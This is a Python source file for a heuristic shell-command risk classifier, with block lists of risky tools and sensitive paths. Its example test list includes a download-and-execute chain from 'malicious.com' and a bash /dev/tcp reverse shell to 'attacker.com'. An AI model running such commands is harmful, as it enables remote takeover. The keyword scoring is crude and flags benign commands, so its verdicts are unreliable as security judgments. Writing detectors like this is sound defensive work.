import re
import spacy
import pandas as pd
from collections import Counter
from sklearn.feature_extraction.text import CountVectorizer, TfidfVectorizer
import warnings

class CommandNLPAnalyzer:
    def __init__(self):
        # Load the spaCy model - using the English language model
        try:
            self.nlp = spacy.load("en_core_web_sm")
        except OSError:
            # If the model isn't available, download it
            import subprocess
            subprocess.run(["python3", "-m", "spacy", "download", "en_core_web_sm"])
            self.nlp = spacy.load("en_core_web_sm")
        
        # Initialize list of risky commands/operations
        self.risky_commands = [
            'rm', 'dd', 'wget', 'curl', 'chmod', 'chown', 'passwd', 
            'sudo', 'su', 'netcat', 'nc', 'base64', 'eval', 'exec',
            'iptables', 'bash', 'sh', 'python', 'perl', 'ruby', 'php',
            'ssh', 'telnet', 'ftp', 'scp', 'rsync', 'nmap', 'gcc',
            'make', 'insmod', 'modprobe', 'useradd', 'mkfifo', 'mknod',
            'setcap', 'setfacl', 'chattr', 'openssl', 'socat',
            'awk', 'sed', 'find', 'grep', 'touch', 'cat', 'echo'
        ]
        
        # Initialize high-risk file paths
        self.sensitive_paths = [
            '/etc/shadow', '/etc/passwd', '/etc/ssh', '/root', '/.ssh',
            '/var/log', '/etc/sudoers', '/etc/crontab', '/proc', 
            '/dev/sd', '/dev/null', '/dev/tcp', '/dev/udp', '/bin/bash',
            '~/.ssh', '/tmp', '/var/tmp', '/dev/shm', '/etc/hosts',
            '/etc/resolv.conf', '/boot', '/lib/modules', '/sbin'
        ]
    
    def parse_command(self, command):
        """Parse shell command into components and analyze structure"""
        # Basic command structure analysis
        doc = self.nlp(command)
        
        # Split by semicolons, pipes, redirections
        command_chain = re.split(r'[;|]', command)
        command_chain = [cmd.strip() for cmd in command_chain if cmd.strip()]
        
        # Extract primary commands (before spaces)
        primary_commands = []
        for cmd in command_chain:
            parts = cmd.split()
            if parts:
                primary_commands.append(parts[0])
        
        return {
            'raw_command': command,
            'command_chain': command_chain,
            'primary_commands': primary_commands,
            'command_count': len(command_chain)
        }
    
    def extract_features(self, command):
        """Extract features from a command for analysis"""
        # Parse the command
        parsed = self.parse_command(command)
        
        # Check for risky commands
        risky_commands_found = [cmd for cmd in parsed['primary_commands'] 
                              if cmd in self.risky_commands]
        
        # Check for sensitive file paths
        sensitive_paths_found = []
        for path in self.sensitive_paths:
            if path in command:
                sensitive_paths_found.append(path)
        
        # Check for shell syntax that might be suspicious
        has_pipe = '|' in command
        has_redirect = '>' in command or '>>' in command
        has_backtick = '`' in command
        has_dollar_paren = '$(' in command and ')' in command
        has_semicolon = ';' in command
        has_ampersand = ' & ' in command or command.endswith('&')
        has_subshell = '(' in command and ')' in command
        
        # Check for download indicators
        download_indicators = any(x in command for x in ['wget', 'curl', 'fetch', 'download', 'git clone'])
        
        # Check for encoding/obfuscation indicators
        encoding_indicators = any(x in command for x in ['base64', 'hex', 'encode', 'decode', 'eval', 'exec'])
        
        # Check for network indicators
        network_indicators = any(x in command for x in ['nc ', 'netcat', 'ncat', 'socat', '/dev/tcp', '/dev/udp'])
        
        # Check for permission modification
        permission_modification = any(x in command for x in ['chmod', 'chown', 'chattr', 'setfacl', 'setcap'])
        
        return {
            'command_length': len(command),
            'command_complexity': parsed['command_count'],
            'risky_commands': risky_commands_found,
            'risky_command_count': len(risky_commands_found),
            'sensitive_paths': sensitive_paths_found,
            'sensitive_path_count': len(sensitive_paths_found),
            'has_pipe': has_pipe,
            'has_redirect': has_redirect,
            'has_backtick': has_backtick,
            'has_dollar_paren': has_dollar_paren,
            'has_semicolon': has_semicolon,
            'has_ampersand': has_ampersand,
            'has_subshell': has_subshell,
            'download_indicators': download_indicators,
            'encoding_indicators': encoding_indicators,
            'network_indicators': network_indicators,
            'permission_modification': permission_modification
        }
    
    def analyze_intent(self, command):
        """Analyze the intent behind a shell command"""
        features = self.extract_features(command)
        
        # Score calculation based on features
        risk_score = 0
        
        # Risky commands contribute to score
        risk_score += features['risky_command_count'] * 1.5
        
        # Sensitive paths are significant indicators
        risk_score += features['sensitive_path_count'] * 2
        
        # Shell syntax features
        if features['has_pipe']: risk_score += 0.5
        if features['has_redirect']: risk_score += 0.5
        if features['has_backtick']: risk_score += 1.5
        if features['has_dollar_paren']: risk_score += 1.5
        if features['has_semicolon']: risk_score += 0.5
        if features['has_ampersand']: risk_score += 1.0
        if features['has_subshell']: risk_score += 1.0
        
        # Important indicators
        if features['download_indicators']: risk_score += 2.0
        if features['encoding_indicators']: risk_score += 2.5
        if features['network_indicators']: risk_score += 2.5
        if features['permission_modification']: risk_score += 2.0
        
        # Normalize score (0-10)
        if risk_score > 10:
            risk_score = 10
        
        # Determine intent classification
        intent_classification = 'informational'
        if risk_score >= 7:
            intent_classification = 'attack'
        elif risk_score >= 4:
            intent_classification = 'reconnaissance'
        elif risk_score >= 2:
            intent_classification = 'exploration'
        
        # Determine specific actions
        actions = []
        if features['download_indicators']:
            actions.append('file_download')
        if features['network_indicators']:
            actions.append('network_activity')
        if features['permission_modification']:
            actions.append('permission_change')
        if features['encoding_indicators']:
            actions.append('obfuscation')
        if features['risky_command_count'] > 0:
            actions.append('system_modification')
        if any(path in features['sensitive_paths'] for path in ['/etc/shadow', '/etc/passwd']):
            actions.append('credential_access')
        
        return {
            'command': command,
            'risk_score': risk_score,
            'intent_classification': intent_classification,
            'actions': actions,
            'features': features
        }
    
    def batch_analyze(self, commands_list):
        """Analyze a batch of commands and return summary statistics"""
        results = [self.analyze_intent(cmd) for cmd in commands_list]
        
        # Analyze distribution of intent classifications
        intent_counts = Counter([r['intent_classification'] for r in results])
        
        # Find most common actions
        all_actions = []
        for r in results:
            all_actions.extend(r['actions'])
        action_counts = Counter(all_actions)
        
        # Calculate average risk score
        avg_risk = sum(r['risk_score'] for r in results) / len(results) if results else 0
        
        return {
            'command_count': len(results),
            'intent_distribution': dict(intent_counts),
            'common_actions': dict(action_counts),
            'average_risk_score': avg_risk,
            'detailed_results': results
        }

if __name__ == "__main__":
    # Example usage
    analyzer = CommandNLPAnalyzer()
    
    # Test with some example commands
    test_commands = [
        "ls -la",
        "cat /etc/passwd",
        "find . -name '*.txt'",
        "wget http://malicious.com/malware.sh; chmod +x malware.sh; ./malware.sh",
        "bash -i >& /dev/tcp/attacker.com/8080 0>&1",
        "echo 'export PATH=$PATH:/usr/local/bin' >> ~/.bashrc"
    ]
    
    # Analyze each command
    for cmd in test_commands:
        result = analyzer.analyze_intent(cmd)
        print(f"Command: {cmd}")
        print(f"Risk Score: {result['risk_score']}")
        print(f"Intent: {result['intent_classification']}")
        print(f"Actions: {', '.join(result['actions'])}")
        print()
    
    # Batch analysis
    batch_result = analyzer.batch_analyze(test_commands)
    print("Batch Analysis:")
    print(f"Command Count: {batch_result['command_count']}")
    print(f"Intent Distribution: {batch_result['intent_distribution']}")
    print(f"Common Actions: {batch_result['common_actions']}")
    print(f"Average Risk Score: {batch_result['average_risk_score']:.2f}")
